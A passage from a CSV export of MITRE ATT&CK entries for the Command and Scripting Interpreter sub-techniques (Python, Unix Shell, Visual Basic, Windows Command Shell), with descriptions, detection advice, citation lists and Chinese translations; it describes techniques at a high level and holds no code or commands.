Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation",True,T1059,,,"Administrator, root, SYSTEM",,Python is installed.,,,,"(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Morphisec ShellTea June 2019),(Citation: Unit 42 MechaFlounder March 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: Unit42 CookieMiner Jan 2019),(Citation: FoxIT Wocao December 2019),(Citation: Google Election Threats October 2020),(Citation: GitHub Pupy),(Citation: ESET Machete July 2019),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: FBI FLASH APT39 September 2020),(Citation: Trend Micro Tick November 2019),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: CISA AA20-301A Kimsuky),(Citation: BitDefender Chafer May 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: synack 2016 review),(Citation: 360 Machete Sep 2020),(Citation: Donut Github),(Citation: Cylance Machete Mar 2017),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: CobaltStrike Daddy May 2017),(Citation: Anomali Rocke March 2019),(Citation: CoinTicker 2019),(Citation: TrendMicro Tonto Team October 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: Cybereason Molerats Dec 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: ESET Ebury Oct 2017),(Citation: Trend Micro Muddy Water March 2021),(Citation: Securelist Machete Aug 2014),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: ESET Dukes October 2019),(Citation: CERT-FR PYSA April 2020),(Citation: GitHub SILENTTRINITY March 2022),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: KISA Operation Muzabi),(Citation: US-CERT TA18-074A),(Citation: Riskiq Remcos Jan 2018),(Citation: CheckPoint Bandook Nov 2020),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Talos PoetRAT April 2020),",命令和脚本解释器/命令和脚本解析器：Python,攻击者可能会滥用 Python 命令和脚本来执行。 Python 是一种非常流行的脚本/编程语言，具有执行许多功能的能力。 Python 可以从命令行交互地执行（通过 <code>python.exe</code> 解释器）或通过可以编写和分发到不同系统的脚本 (.py)。 Python 代码也可以编译成二进制可执行文件。 Python 自带了很多内置的包来和底层系统交互，比如文件操作和设备 I/O。攻击者可以使用这些库来下载和执行命令或其他脚本以及执行各种恶意行为。
T1059.004,Command and Scripting Interpreter: Unix Shell,"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.

Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.",https://attack.mitre.org/techniques/T1059/004,09 March 2020,26 July 2021,1.1,Execution,"Unix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. ","Linux, macOS","Command: Command Execution, Process: Process Creation",True,T1059,,,"root, User",1.0,,,,,"(Citation: Scarlet Mimic Jan 2016),(Citation: trendmicro xcsset xcode project 2020),(Citation: Trend Micro TeamTNT),(Citation: Leonardo Turla Penquin May 2020),(Citation: Fidelis Turbo),(Citation: Unit42 CookieMiner Jan 2019),(Citation: ESET DazzleSpy Jan 2022),(Citation: 20 macOS Common Tools and Techniques),(Citation: Talos Rocke August 2018),(Citation: objsee mac malware 2017),(Citation: ESET TeleBots Oct 2018),(Citation: Proofpoint NETWIRE December 2020),(Citation: ESET LoudMiner June 2019),(Citation: Carbon Black Shlayer Feb 2019),(Citation: Chaos Stolen Backdoor),(Citation: Fysbis Palo Alto Analysis),(Citation: FireEye Periscope March 2018),(Citation: CISA AppleJeus Feb 2021),(Citation: ObjectiveSee AppleJeus 2019),(Citation: Unit 42 Hildegard Malware),(Citation: Objective-See MacMa Nov 2021),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: sentinelone apt32 macOS backdoor 2020),(Citation: objective-see windtail1 dec 2018),(Citation: NSA/FBI Drovorub August 2020),(Citation: CoinTicker 2019),(Citation: Medium Anchor DNS July 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: sentinelone shlayer to zshlayer),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Trend Micro Skidmap),(Citation: Aqua Kinsing April 2020),(Citation: FireEye APT41 March 2020),(Citation: objectivesee osx.shlayer apple approved 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: ANSSI Sandworm January 2021),(Citation: ESET Kobalos Feb 2021),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Cisco Talos Intelligence Group),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Intezer Doki July 20),",命令和脚本解释器/命令和脚本解析器：Unix Shell,攻击者可能会滥用 Unix shell 命令和脚本来执行。 Unix shell 是 Linux 和 macOS 系统上的主要命令提示符，尽管存在许多 Unix shell 的变体（例如 sh、bash、zsh 等），具体取决于特定的操作系统或发行版。（引用：DieNet Bash）（引用：Apple ZShell）Unix shell 可以控制系统的各个方面，其中某些命令需要提升权限。 Unix shell 还支持能够顺序执行命令的脚本以及其他典型的编程操作，例如条件和循环。 shell 脚本的常见用途包括长时间或重复的任务，或者需要在多个系统上运行相同的命令集。攻击者可能会滥用 Unix shell 来执行各种命令或有效负载。交互式 shell 可以通过命令和控制通道或在横向移动期间访问，例如使用 [SSH](https://attack.mitre.org/techniques/T1021/004)。攻击者还可以利用 shell 脚本在受害者身上传递和执行多个命令，或者作为用于持久性的有效负载的一部分。
T1059.005,Command and Scripting Interpreter: Visual Basic,"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)

Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)

Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )",https://attack.mitre.org/techniques/T1059/005,09 March 2020,07 March 2022,1.3,Execution,"Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.

Understanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.","Linux, Windows, macOS","Command: Command Execution, Module: Module Load, Process: Process Creation, Script: Script Execution",True,T1059,,,"Administrator, SYSTEM, User",,,,,,"(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: ESET Gamaredon June 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: FoxIT Wocao December 2019),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Trend Micro Tick November 2019),(Citation: Unit 42 Inception November 2018),(Citation: TrendMicro MacOS April 2018),(Citation: Group IB Ransomware September 2020),(Citation: Symantec Waterbug Jun 2019),(Citation: Palo Alto Comnie),(Citation: Volexity Patchwork June 2018),(Citation: Cybereason Chaes Nov 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: Carbon Black JCry May 2019),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Talos Lokibot Jan 2021),(Citation: Symantec Shuckworm January 2022),(Citation: MuddyWater TrendMicro June 2018),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Proofpoint TA459 April 2017),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Unit42 Xbash Sept 2018),(Citation: Crowdstrike Qakbot October 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Symantec Emotet Jul 2018),(Citation: Symantec MuddyWater Dec 2018),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Unit 42 OilRig Sept 2018),(Citation: Carbon Black Emotet Apr 2019),(Citation: ThreatConnect Kimsuky September 2020),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Reaqta MuddyWater November 2017),(Citation: SecureWorks August 2019),(Citation: ClearSky MuddyWater June 2019),(Citation: TrendMicro Confucius APT Feb 2018),(Citation: McAfee Sharpshooter December 2018),(Citation: Unit42 Molerat Mar 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Cisco Ukraine Wipers January 2022),(Citation: FBI FLASH APT39 September 2020),(Citation: ESET TeleBots Oct 2018),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: CERT-EE Gamaredon January 2021),(Citation: Palo Alto OilRig May 2016),(Citation: Cybereason Oceanlotus May 2017),(Citation: Talos Bisonal Mar 2020),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Antiy CERT Ramsay April 2020),(Citation: 360 Machete Sep 2020),(Citation: Donut Github),(Citation: CobaltStrike Daddy May 2017),(Citation: Trend Micro Qakbot December 2020),(Citation: Bromium Ursnif Mar 2017),(Citation: Cofense NanoCore Mar 2018),(Citation: G Data Sodinokibi June 2019),(Citation: Github Koadic),(Citation: Flashpoint FIN 7 March 2019),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: Check Point APT34 April 2021),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Grandoreiro April 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: IBM TA505 April 2020),(Citation: FireEye FIN7 Aug 2018),(Citation: ESET BlackEnergy Jan 2016),(Citation: Proofpoint TA505 June 2018),(Citation: CheckPoint Bandook Nov 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Eset Ramsay May 2020),(Citation: Cylance Dust Storm),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: McAfee Lazarus Jul 2020),(Citation: Microsoft Actinium February 2022),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Unit 42 Bisonal July 2018),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Mandiant UNC3313 Feb 2022),(Citation: Unit 42 QUADAGENT July 2018),(Citation: fsecure NanHaiShu July 2016),(Citation: Group IB Cobalt Aug 2017),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Picus Sodinokibi January 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Talos Group123),(Citation: PTSecurity Higaisa 2020),(Citation: Kroll Qakbot June 2020),(Citation: Lazarus APT January 2022),(Citation: Securelist Remexi Jan 2019),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Securelist MuddyWater Oct 2018),(Citation: ATT Sidewinder January 2021),(Citation: Symantec Bumblebee June 2022),(Citation: Proofpoint NETWIRE December 2020),(Citation: Unit 42 WhisperGate January 2022),(Citation: FireEye NETWIRE March 2019),(Citation: Trend Micro Qakbot May 2020),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: FireEye MuddyWater Mar 2018),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Proofpoint TA505 Sep 2017),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Kaspersky MoleRATs April 2019),(Citation: Microsoft Holmium June 2020),(Citation: Trend Micro Emotet Jan 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: ESET Telebots Dec 2016),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: NTT Security Flagpro new December 2021),(Citation: Kaspersky StoneDrill 2017),(Citation: Talos Emotet Jan 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Trend Micro TA505 June 2019),(Citation: Picus Emotet Dec 2018),(Citation: Talos PoetRAT April 2020),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Rancor Unit42 June 2018),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Lab52 WIRTE Apr 2019),(Citation: Secureworks IRON TILDEN Profile),(Citation: Talos Frankenstein June 2019),(Citation: Qualys LolZarus),(Citation: Talos MuddyWater Jan 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: Kaspersky WIRTE November 2021),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Proofpoint Leviathan Oct 2017),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Malwarebytes SmokeLoader 2016),(Citation: Unit 42 KerrDown February 2019),(Citation: Talos Cobalt Group July 2018),(Citation: ClearSky MuddyWater Nov 2018),(Citation: ClearSky Lazarus Aug 2020),(Citation: Trend Micro Muddy Water March 2021),(Citation: TrendMicro Gamaredon April 2020),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Talos PoetRAT October 2020),(Citation: Dragos Crashoverride 2018),(Citation: Juniper IcedID June 2020),(Citation: ESET Telebots June 2017),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Cyberint Qakbot May 2021),(Citation: BlackBerry Bahamut),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Default VBS macros Blocking ),(Citation: win10_asr)",命令和脚本解释器/命令和脚本解析器：Visual Basic,攻击者可能会滥用 Visual Basic (VB) 来执行。 VB 是微软创建的一种编程语言，与许多 Windows 技术如 [Component Object Model](https://attack.mitre.org/techniques/T1559/001) 和 [Native API](https://attack) 具有互操作性.mitre.org/techniques/T1106）通过 Windows API。尽管 VB 被标记为没有未来发展计划的遗留语言，但 .NET Framework 和跨平台 .NET Core 集成并支持 VB。（引用：VB .NET Mar 2020）（引用：VB Microsoft）基于 VB 的衍生语言也有已创建，例如 Visual Basic for Applications (VBA) 和 VBScript。 VBA 是一种内置于 Microsoft Office 以及多个第三方应用程序中的事件驱动编程语言。（引用：Microsoft VBA）（引用：Wikipedia VBA） VBA 使文档能够包含用于自动执行任务和其他功能的宏在主机上。 VBScript 是 Windows 主机上的默认脚本语言，也可以在提供给 Internet Explorer 的 HTML 应用程序 (HTA) 网页上代替 [JavaScript](https://attack.mitre.org/techniques/T1059/007)（尽管大多数现代浏览器不支持 VBScript）。（引用：Microsoft VBScript）攻击者可能使用 VB 有效负载来执行恶意命令。常见的恶意使用包括使用 VBScript 自动执行行为或将 VBA 内容嵌入 [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) 有效负载（其中可能还涉及 [Mark-of-the-Web绕过]（https://attack.mitre.org/techniques/T1553/005）启用执行）。（引用：默认 VBS 宏阻塞）
T1059.003,Command and Scripting Interpreter: Windows Command Shell,"Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)

Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",https://attack.mitre.org/techniques/T1059/003,09 March 2020,26 July 2021,1.2,Execution,"Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",Windows,"Command: Command Execution, Process: Process Creation",True,T1059,,,User,1.0,,,,,"(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Fidelis njRAT June 2013),(Citation: ESET Gamaredon June 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: ESET RTM Feb 2017),(Citation: ESET LoudMiner June 2019),(Citation: Kaspersky QakBot September 2021),(Citation: Securelist Darkhotel Aug 2015),(Citation: Unit42 Emissary Panda May 2019),(Citation: Symantec Waterbug Jun 2019),(Citation: Cybereason Bazar July 2020),(Citation: FireEye APT10 April 2017),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Google EXOTIC LILY March 2022),(Citation: KISA Operation Muzabi),(Citation: Deep Instinct TA505 Apr 2019),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Crowdstrike Qakbot October 2020),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FireEye APT34 Dec 2017),(Citation: Symantec MuddyWater Dec 2018),(Citation: Unit 42 OilRig Sept 2018),(Citation: Proofpoint TA505 Jan 2019),(Citation: FireEye APT33 Sept 2017),(Citation: US-CERT TYPEFRAME June 2018),(Citation: McAfee Sharpshooter December 2018),(Citation: CIRCL PlugX March 2013),(Citation: Sophos Ragnar May 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Cybereason Oceanlotus May 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: 360 Machete Sep 2020),(Citation: PaloAlto NanoCore Feb 2016),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Cymmetria Patchwork),(Citation: Avira Mustang Panda January 2020),(Citation: F-Secure CozyDuke),(Citation: CarbonBlack RobbinHood May 2019),(Citation: Check Point APT34 April 2021),(Citation: NCC Group APT15 Alive and Strong),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Red Canary NETWIRE January 2020),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: FireEye FIN7 Aug 2018),(Citation: APT15 Intezer June 2018),(Citation: Cylance Dust Storm),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Unit 42 RGDoor Jan 2018),(Citation: PWC WellMess July 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Symantec Sowbug Nov 2017),(Citation: Check Point Warzone Feb 2020),(Citation: Securelist Remexi Jan 2019),(Citation: Unit 42 Lucifer June 2020),(Citation: Symantec Wiarp May 2012),(Citation: Unit42 Cannon Nov 2018),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Unit 42 Gamaredon February 2022),(Citation: Cylance Shell Crew Feb 2017),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: JoeSecurity Egregor 2020),(Citation: Cybereason Egregor Nov 2020),(Citation: Volexity PowerDuke November 2016),(Citation: Trend Micro TA505 June 2019),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Cylance Cleaver),(Citation: Picus Emotet Dec 2018),(Citation: Rancor Unit42 June 2018),(Citation: NCC Group WastedLocker June 2020),(Citation: Forcepoint Felismus Mar 2017),(Citation: ClearSky Siamesekitten August 2021),(Citation: FireEye Maze May 2020),(Citation: Accenture Lyceum Targets November 2021),(Citation: Unit 42 SeaDuke 2015),(Citation: Proofpoint Leviathan Oct 2017),(Citation: GDATA Zeus Panda June 2017),(Citation: Dell TG-3390),(Citation: FireEye APT38 Oct 2018),(Citation: Unit42 RDAT July 2020),(Citation: Bitdefender Naikon April 2021),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: PaloAlto DNS Requests May 2016),(Citation: Check Point Meteor Aug 2021),(Citation: Carbon Black HotCroissant April 2020),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Trend Micro Ransomware February 2021),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: FireEye APT32 May 2017),(Citation: Kaspersky Adwind Feb 2016),(Citation: Intezer HiddenWasp Map 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: Fortinet Remcos Feb 2017),(Citation: ClearSky Wilted Tulip July 2017),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Dell Sakula),(Citation: US-CERT SHARPKNOT June 2018),(Citation: Cybereason Chaes Nov 2020),(Citation: Zscaler Cobian Aug 2017),(Citation: Carbon Black JCry May 2019),(Citation: Talos Sodinokibi April 2019),(Citation: Prevailion DarkWatchman 2021),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Unit 42 CARROTBAT January 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Zscaler Higaisa 2020),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Secureworks Karagany July 2019),(Citation: Cybereason Clop Dec 2020),(Citation: Tarrask scheduled task),(Citation: CISA EB Aug 2020),(Citation: McAfee Night Dragon),(Citation: CERT-EE Gamaredon January 2021),(Citation: Malwarebytes Pony April 2016),(Citation: Talos Bisonal Mar 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye Periscope March 2018),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: JPCert TSCookie March 2018),(Citation: Proofpoint TA505 October 2019),(Citation: Cofense NanoCore Mar 2018),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: Unit 42 PingPull Jun 2022),(Citation: Github Koadic),(Citation: BiZone Lizar May 2021),(Citation: FireEye HAWKBALL Jun 2019),(Citation: JPCert PLEAD Downloader June 2018),(Citation: Talos Konni May 2017),(Citation: Unit 42 TA551 Jan 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Malwarebytes Konni Aug 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Unit 42 QUADAGENT July 2018),(Citation: FireEye FIN6 Apr 2019),(Citation: Group IB Cobalt Aug 2017),(Citation: Secureworks REvil September 2019),(Citation: US-CERT HARDRAIN March 2018),(Citation: Talos Group123),(Citation: DFIR Ryuk's Return October 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Proofpoint NETWIRE December 2020),(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018),(Citation: Malwarebytes DarkComet March 2018),(Citation: Cybereason Soft Cell June 2019),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: FOX-IT May 2016 Mofang),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: Korean FSI TA505 2020),(Citation: ESET EvilNum July 2020),(Citation: Cofense RevengeRAT Feb 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: US-CERT Bankshot Dec 2017),(Citation: FireEye FIN7 March 2017),(Citation: CrowdStrike Ryuk January 2019),(Citation: Zscaler Bazar September 2020),(Citation: SecureList Silence Nov 2017),(Citation: Sofacy DealersChoice),(Citation: Lazarus RATANKBA),(Citation: Qualys LolZarus),(Citation: CrowdStrike Putter Panda),(Citation: Secureworks BRONZEUNION Feb 2019),(Citation: FireEye APT41 Aug 2019),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Cybereason Astaroth Feb 2019),(Citation: Cybereason Molerats Dec 2020),(Citation: Zscaler Kasidet),(Citation: Mandiant APT1 Appendix),(Citation: Unit42 OilRig Nov 2018),(Citation: OilRig ISMAgent July 2017),(Citation: NCC Group Chimera January 2021),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: FireEye Operation Double Tap),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Unit 42 MechaFlounder March 2019),(Citation: Volexity SolarWinds),(Citation: McAfee Bankshot),(Citation: FoxIT Wocao December 2019),(Citation: Lotus Blossom Dec 2015),(Citation: Cylance Sodinokibi July 2019),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: RATANKBA),(Citation: ESET Sednit Part 2),(Citation: Volexity Patchwork June 2018),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Symantec Shuckworm January 2022),(Citation: Trend Micro DRBControl February 2020),(Citation: ASERT InnaputRAT April 2018),(Citation: ESET LightNeuron May 2019),(Citation: Talos Seduploader Oct 2017),(Citation: SecureWorks August 2019),(Citation: McAfee Cuba April 2021),(Citation: Unit42 Molerat Mar 2020),(Citation: Fidelis INOCNATION),(Citation: Talos NavRAT May 2018),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: GitHub QuasarRAT),(Citation: McAfee Oceansalt Oct 2018),(Citation: Palo Alto OilRig May 2016),(Citation: Github AD-Pentest-Script),(Citation: IBM MegaCortex),(Citation: TrendMicro Trickbot Feb 2019),(Citation: US-CERT Volgmer Nov 2017),(Citation: FireEye CARBANAK June 2017),(Citation: ESET Okrum July 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: Flashpoint FIN 7 March 2019),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: CheckPoint Bandook Nov 2020),(Citation: Symantec Darkmoon Aug 2005),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Checkpoint IndigoZebra July 2021),(Citation: FireEye APT37 Feb 2018),(Citation: Trend Micro IXESHE 2012),(Citation: Malwarebytes Higaisa 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: PTSecurity Higaisa 2020),(Citation: Unit 42 WhisperGate January 2022),(Citation: Palo Alto MoonWind March 2017),(Citation: ESET ComRAT May 2020),(Citation: Talos ZxShell Oct 2014),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Group IB GrimAgent July 2021),(Citation: Anomali Evasive Maneuvers July 2015),(Citation: NTT Security Flagpro new December 2021),(Citation: FireEye APT41 March 2020),(Citation: ESET Gelsemium June 2021),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: FireEye HIKIT Rootkit Part 2),(Citation: Talos Frankenstein June 2019),(Citation: CarbonBlack Conti July 2020),(Citation: FireEye FELIXROOT July 2018),(Citation: Sophos Netwalker May 2020),(Citation: Sophos Maze VM September 2020),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: Talos PoetRAT October 2020),(Citation: Dragos Crashoverride 2018),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Cyberreason Anchor December 2019),(Citation: FireEye Obfuscation June 2017),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: EFF Manul Aug 2016),(Citation: ATT QakBot April 